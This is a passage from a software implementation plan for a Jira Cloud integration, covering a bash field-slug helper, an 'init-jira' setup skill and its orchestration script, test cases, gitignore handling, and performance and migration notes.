behaviours covered by the test. Source `jira-common.sh` for
`jira_atomic_write_json`, `jira_state_dir`, and `jira_with_lock`
(the mkdir-based lock wrapper added in Phase 2).

The slugify function is plain bash + `tr` + `sed`. It uses
`tr '[:upper:]' '[:lower:]'` for lowercase rather than the bash 4+
`${var,,}` parameter expansion (macOS ships `/bin/bash` 3.2 by
default, and the helper must work without a `mise`-supplied bash 5).
It also forces `LC_ALL=C` so character-class matching is locale-
independent — a UTF-8 field name's slug should be the same on every
machine:

```bash
jira_field_slugify() {
  local s
  s=$(LC_ALL=C printf '%s' "$1" | tr '[:upper:]' '[:lower:]')
  s=$(LC_ALL=C printf '%s' "$s" \
    | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; s/[^a-z0-9]+/-/g; s/^-+//; s/-+$//')
  printf '%s\n' "$s"
}
```

Test fixture additions: a UTF-8 field name (`"Sprint Velocidad"`,
`"Story Points 故事点"`) is added to the resolve test corpus to
assert deterministic slug output across BSD/GNU sed and across
locales.

Documented exit codes:

- 0: success
- 50: `E_FIELD_NOT_FOUND`
- 51: `E_FIELD_CACHE_MISSING`
- 52: `E_FIELD_CACHE_CORRUPT`
- 53: `E_REFRESH_LOCKED` (another refresh is in progress;
  `meta/integrations/jira/.lock` held by another process)

### Success Criteria

#### Automated Verification

- [x] `bash skills/integrations/jira/scripts/test-jira-fields.sh`
  passes (thirteen cases).
- [x] `mise run test` passes.

#### Manual Verification

- [ ] Against a live tenant, run
  `bash skills/integrations/jira/scripts/jira-fields.sh refresh`
  and confirm `meta/integrations/jira/fields.json` is populated with
  ~50–200 entries.
- [ ] Run `jira-fields.sh resolve sprint` and confirm an instance-specific
  `customfield_NNNNN` ID is printed.

---

## Phase 7: init-jira skill

### Overview

The user-facing skill that walks through credential setup, runs
`/myself` verification, discovers projects and fields, and persists the
team-shared catalogue. Authored via the
`skill-creator:skill-creator` skill (per the user's instruction). The
SKILL.md is the only content authored by hand-via-skill-creator in this
phase; all helpers are bash and not SKILL-bearing.

### Changes Required

#### 1. Skill scaffolding via skill-creator

**Action**: invoke `Skill` with `skill: skill-creator:skill-creator`,
arguments scoped to "create a new skill at
`skills/integrations/jira/init-jira/`".

The resulting `SKILL.md` includes:

- YAML frontmatter:
  - `name: init-jira`
  - `description`: one-paragraph summary mentioning Jira Cloud, that
    the skill verifies credentials, persists the team-shared
    field/project catalogue under `<paths.integrations>/jira/`
    (default `meta/integrations/jira/`), and is idempotent.
  - `disable-model-invocation: true` — matching every other slash-
    only skill in the repo (`skills/work/create-work-item/SKILL.md`,
    `skills/config/configure/SKILL.md`, etc.). `init-jira` is a
    user-driven setup flow that prompts for credentials and writes
    config files; auto-invocation is the wrong default.
  - `argument-hint: "[--site <subdomain>] [--email <addr>] [--refresh-fields] [--list-projects] [--list-fields]"`
  - `allowed-tools: Bash(${CLAUDE_PLUGIN_ROOT}/skills/integrations/jira/scripts/*), Bash(${CLAUDE_PLUGIN_ROOT}/scripts/config-*), Bash(jq), Bash(curl)`
- Bang-prefix preprocessor lines:
  - `!\`${CLAUDE_PLUGIN_ROOT}/scripts/config-read-context.sh\``
  - `!\`${CLAUDE_PLUGIN_ROOT}/scripts/config-read-skill-context.sh init-jira\``
- Numbered process steps mirroring research §4.9:
  1. Parse CLI flags.
  2. Resolve site (CLI > config > prompt).
  3. Resolve email (CLI > config > prompt).
  4. Resolve token via `jira-auth-cli.sh`; if absent, print the
     API-token URL and exit non-zero.
  5. Verify via `jira-request.sh GET /rest/api/3/myself`; persist
     `site.json` with the **fixed schema** `{site, accountId}` only.
     `emailAddress`, `displayName`, `avatarUrls`, `locale`, and any
     other fields returned by `/myself` are explicitly excluded. The
     persisted `site.json` is committed to VCS, so the schema's job
     is to prevent PII (the verified email) and any header-derived
     data from leaking into the team-shared cache. **No timestamp**
     is included: `lastVerified` is tracked out-of-band in
     `<paths.integrations>/jira/.refresh-meta.json` (gitignored)
     alongside the field-cache timestamp, so consecutive `/init-jira`
     runs against the same tenant produce a byte-identical
     `site.json`. Phase 7 tests assert that the persisted file's
     keys are *exactly* `{site, accountId}` and that two consecutive
     `verify` runs leave the file byte-identical.
  6. Discover projects via `GET /rest/api/3/project`; persist
     `projects.json` with shape
     `{site, projects: [{key, id, name}]}`. Other fields returned
     by Jira (description, lead user objects, avatars) are excluded.
     No timestamp; `lastUpdated` for projects also lives in
     `.refresh-meta.json`. Phase 7 tests assert byte-idempotency on
     no-op rediscovery, mirroring the `fields.json` invariant.
  7. Discover fields via `GET /rest/api/3/field`; persist
     `fields.json` with computed slugs.
  8. If `work.default_project_code` is unset, prompt the user to
     pick a project; offer to write to `accelerator.md` or
     `accelerator.local.md`.
- Sub-modes documented:
  - `--refresh-fields`: skip steps 1–4 (assume verified) and re-run 7
    only.
  - `--list-projects`, `--list-fields`: print cached data, do not
    fetch.
- Closing bang-prefix line:
  `!\`${CLAUDE_PLUGIN_ROOT}/scripts/config-read-skill-instructions.sh init-jira\``

#### 2. jira-init-flow.sh (orchestration helper)

**File**: `skills/integrations/jira/scripts/jira-init-flow.sh`
**Changes**: new executable. The eight-step orchestration lives in
deterministic bash, not in LLM-interpreted SKILL.md prose. The
SKILL is a thin user-facing wrapper that prints introductory
context and dispatches to `jira-init-flow.sh` with the parsed
flags; the bash helper carries the load-bearing logic
(idempotency checks, conditional sub-modes, prompting, atomic
persistence).

The previous proposal — defer the lift decision to the
skill-creator authoring session — is rejected because the
orchestration is exactly the load-bearing logic that needs unit
tests, deterministic behaviour, and the same TDD discipline as
every other helper in the integration. SKILL prose is the wrong
artefact for orchestration: it has no test harness, no
deterministic execution, and no clean way to assert idempotency.

Subcommands:

```
jira-init-flow.sh verify           # steps 1–5: parse flags, resolve
                                   # site/email/token, verify /myself,
                                   # persist site.json
jira-init-flow.sh discover         # steps 6–7: discover projects + fields,
                                   # persist projects.json + fields.json
jira-init-flow.sh prompt-default   # step 8: prompt for default project key
                                   # if work.default_project_code is unset
jira-init-flow.sh refresh-fields   # alias for `jira-fields.sh refresh`
jira-init-flow.sh list-projects    # prints cached projects.json
jira-init-flow.sh list-fields      # prints cached fields.json
jira-init-flow.sh                  # full flow: verify → discover → prompt
```

Acquires `jira_with_lock` for any command that writes more than one
file (full flow, `discover`).

Honours `--non-interactive` (or `-y`) — fails fast with
`E_INIT_NEEDS_CONFIG` (60) when a value would otherwise be prompted
for, so the helper is usable from CI/scripts.

**Gitignore management**: both the full flow and the `verify`
subcommand call `_jira_ensure_gitignore` as their first
side-effecting step (before persisting `site.json`). This ensures
consumer repos — not just the plugin development repo — get the
necessary entries. The function:

1. Resolves `jira_state_dir` and computes the two paths relative to
   the repo root: `<rel>/jira/.lock` and `<rel>/jira/.refresh-meta.json`,
   where `<rel>` is the value of `paths.integrations` (default
   `meta/integrations`).
2. Locates the repo root `.gitignore`, creating it if absent.
3. Appends each entry only if not already present — literal string
   match, so re-running `/init-jira` never duplicates lines.
4. Emits no output on success; warns to stderr if `.gitignore` is
   not writable.

Emits a final summary line on success: `Initialised Jira
integration: <N> fields, <M> projects, default project <KEY>` so
the user sees at-a-glance what happened.

#### 2b. test-jira-init-flow.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-init-flow.sh`
**Changes**: new test script. Mocks the network via the Phase 5
mock fixture. Cases:

1. Full flow with all values pre-configured runs cleanly and
   produces the expected `site.json` / `projects.json` /
   `fields.json` shapes.
2. Idempotency: a second invocation against the same mock leaves
   the three persisted files byte-identical.
3. `--non-interactive` with missing `jira.site` exits 60
   (`E_INIT_NEEDS_CONFIG`).
4. `--list-fields` against a populated cache prints the cache
   content and makes zero network calls (asserted via the mock's
   request count).
5. `--list-projects` similarly.
6. `--refresh-fields` updates `fields.json` only; `site.json` and
   `projects.json` are unchanged.
7. `--non-interactive` with all values set runs the full flow with
   no prompts.
8. Verify-only (`verify` subcommand) leaves `projects.json` and
   `fields.json` untouched.
9. **Gitignore entries written**: after a successful full flow the
   repo root `.gitignore` contains both `meta/integrations/jira/.lock`
   and `meta/integrations/jira/.refresh-meta.json`. Running the flow
   a second time does not duplicate either entry (idempotency).
10. **Custom `paths.integrations`**: when `accelerator.md` sets
    `paths.integrations: .state/integrations`, the entries written
    to `.gitignore` are `.state/integrations/jira/.lock` and
    `.state/integrations/jira/.refresh-meta.json` — not the defaults.

#### 3. Eval scaffolding (omitted in Phase 1)

**No `evals/` directory is created for `init-jira` in this phase.**
Skill evals are not load-bearing for an interactive credential-setup
skill. `scripts/test-evals-structure.sh` only inspects directories
that contain `evals.json`; omitting the directory entirely is the
cleanest way to satisfy the linter.

The previous proposal — ship a bare `evals.json` stub — is rejected
because `test-evals-structure.sh` requires three things that a stub
cannot satisfy: (1) `benchmark.json` MUST exist alongside
`evals.json`, (2) every eval `id` in `evals.json` must appear as an
`eval_id` with `configuration: with_skill` in `benchmark.json`'s
`runs[]`, and (3) `run_summary.with_skill.pass_rate.mean >= 0.9`. A
bare evals.json would fail check 1 and turn `mise run test` red.

If interactive evals become valuable later, ship the `evals.json` +
`benchmark.json` pair together as a separate change matching the
schema in `skills/work/create-work-item/evals/`.

### Success Criteria

#### Automated Verification

- [x] `bash scripts/test-evals-structure.sh` passes (no `evals/`
  directory under `init-jira/` — the linter only inspects
  directories that contain `evals.json`, so absence is a pass).
- [x] `bash scripts/test-lens-structure.sh` passes (init-jira is not
  a lens but the linter must not regress).
- [x] `bash scripts/test-format.sh` passes.
- [x] `mise run test` passes.

#### Manual Verification

- [ ] In Claude Code, type `/init-jira` and confirm the skill is
  discoverable via the slash menu.
- [ ] Walk through the full flow against a real Jira tenant. Confirm:
  - Credentials are accepted.
  - `Verified as <displayName> (<accountId>)` confirmation prints.
  - `meta/integrations/jira/{site,fields,projects}.json` are
    populated and committed-able.
  - Re-running the skill is idempotent (no duplicate prompts; cache
    overwritten atomically).
- [ ] Run `/init-jira --list-fields` and confirm the cached field
  catalogue prints without a network call.
- [ ] Run `/init-jira --refresh-fields` and confirm only the field
  cache is updated; site and projects are unchanged.

---

## Testing Strategy

### Unit Tests (per phase)

Each milestone owns one test script under
`skills/integrations/jira/scripts/test-jira-<helper>.sh`. The umbrella
`test-jira-scripts.sh` calls each in sequence and aggregates exit
codes. New scripts are wired into `tasks/test.py` via the umbrella, so
the integration runner picks them up automatically once the umbrella
calls them.

Test conventions:

- Sources `scripts/test-helpers.sh` for `assert_eq`, `assert_exit_code`,
  `test_summary`.
- Defines local `assert_contains`, `assert_matches_regex`,
  `assert_file_content_eq`, `setup_repo` matching
  `skills/work/scripts/test-work-item-scripts.sh`.
- `mktemp -d` for fixtures; `trap … EXIT` for cleanup.
- Mock HTTP server fixture (M5) backgrounded per test case;
  `kill $MOCK_PID` in cleanup.

### Integration Tests

`mise run test` is the umbrella and the gate. The phase intentionally
adds no live-tenant tests to CI — those live in the manual verification
step of each milestone.

### Round-Trip Tests

Phase 4 adds `test-jira-adf-roundtrip.sh` which exercises both
direction helpers as a fixed-point pair against the full fixture set.
Failures here indicate either compiler or renderer drift, regardless
of which side caused it.

### Manual Testing Steps

After all milestones land:

1. Configure a real Jira Cloud tenant in `accelerator.local.md` with
   `jira.site`, `jira.email`, and `jira.token_cmd`.
2. Run `/init-jira` from a fresh tree (no `meta/integrations/jira/*`
   yet); confirm the eight steps execute cleanly.
3. Inspect `meta/integrations/jira/site.json`,
   `meta/integrations/jira/fields.json`,
   `meta/integrations/jira/projects.json` and confirm shape and
   contents.
4. Run `bash skills/integrations/jira/scripts/jira-request.sh GET
   /rest/api/3/myself` and verify it round-trips through real auth.
5. Hand-construct a Markdown description, pipe through
   `jira-md-to-adf.sh`, and confirm the resulting ADF parses and is
   accepted by Jira's API explorer for issue creation (do not actually
   create — paste-and-validate only).
6. Run `/init-jira` a second time; confirm idempotency (no duplicate
   prompts, no churn in committed cache files when nothing changed
   tenant-side).

## Performance Considerations

- The bash + jq + awk implementation is well within latency budgets for
  the supported document sizes. Even a 10 KB description compiles in
  well under a second on commodity hardware.
- `jira-fields.sh refresh` makes a single non-paginated call to
  `GET /rest/api/3/field`; instances with thousands of fields may
  return a large payload (~MB). The current research accepts this; if
  it becomes a concern, the paginated `field/search` endpoint is the
  drop-in replacement.
- Retry logic on 429 is bounded (4 attempts, 60 s `Retry-After` cap)
  so a sustained outage cannot hang `init-jira` indefinitely.
- `meta/integrations/jira/fields.json` is checked in; consumers reading
  the cache pay zero network cost. Refresh is opt-in via
  `init-jira --refresh-fields` or `jira-fields.sh refresh`.

## Migration Notes

- This is a greenfield phase: `skills/integrations/jira/` and
  `meta/integrations/jira/` are both new directories. No existing
  user state is touched.
- The future `meta/integrations/` →
  `.accelerator/state/integrations/` reorg captured in
  `meta/notes/2026-04-29-accelerator-config-state-reorg.md` will
  require a migration when undertaken; this phase deliberately
  commits the v1 location and accepts that cost.
- Re-running `/init-jira` is always safe (idempotent atomic writes).
  A user who edits `meta/integrations/jira/fields.json` by hand will
  see their edits overwritten on next refresh — this is intentional;
  the file is a cache, not a source of truth.
- If a user removes `jira.token_cmd` from their config and has no env
  var fallback, `jira-auth-cli.sh` exits cleanly with `E_NO_TOKEN` and
  points at the docs. No partial-state recovery is needed.

## References

- Original research:
  `meta/research/codebase/2026-04-29-jira-cloud-integration-skills.md` (Phase 1
  scope at lines 1014–1046; design details inlined above for phase
  self-sufficiency).
- Related notes:
  `meta/notes/2026-04-29-accelerator-config-state-reorg.md`
  (future state-directory reorg; deferred).
- Configuration framework:
  `meta/decisions/ADR-0017-configuration-extension-points.md`.
- Default-project-key reuse:
  `meta/research/codebase/2026-04-28-configurable-work-item-id-pattern.md`,
  `meta/plans/2026-04-28-configurable-work-item-id-pattern.md`.
